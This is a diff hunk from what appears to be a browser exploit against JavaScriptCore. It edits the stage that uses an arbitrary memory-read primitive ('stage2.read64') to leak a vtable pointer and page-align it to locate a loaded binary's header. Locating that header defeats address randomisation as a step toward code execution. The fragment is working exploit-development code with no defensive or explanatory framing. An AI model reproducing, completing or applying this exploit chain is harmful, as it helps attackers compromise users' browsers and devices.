@@ -636,10 +636,15 @@ for (var i = 0; i < 1000; ++i) {
         //hopefully points to JavaScriptCore Base!
         print("m_runloop @ " + hex1(m_runloop))
         var vtable = stage2.read64(m_runloop);
-        var jscbase = Sub(vtable, new Int64(vtable).lo() & 0xfff);
+        //var jscbase = Sub(vtable, new Int64(vtable).lo() & 0xfff);
         print("vtable @ " + hex1(vtable));
-	print("JSC Base? @ " + jscbase);
-	print("base dump?" + String.fromCharCode(...stage2.read(jscbase, 0x100)))
+	var anchor = stage2.read64(vtable);
+	print("anchor @" + hex1(anchor));
+	var hdr = Sub(anchor, new Int64(anchor).lo() & 0xfff);
+	print("header @ " + hdr);
+	      
+	//print("JSC Base? @ " + jscbase);
+	//print("base dump?" + String.fromCharCode(...stage2.read(jscbase, 0x100)))
         //print("JSC __TEXT::text instance @ " + hex1(jscbase))
 	/*var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
 	print("JSC __TEXT header @" + header);
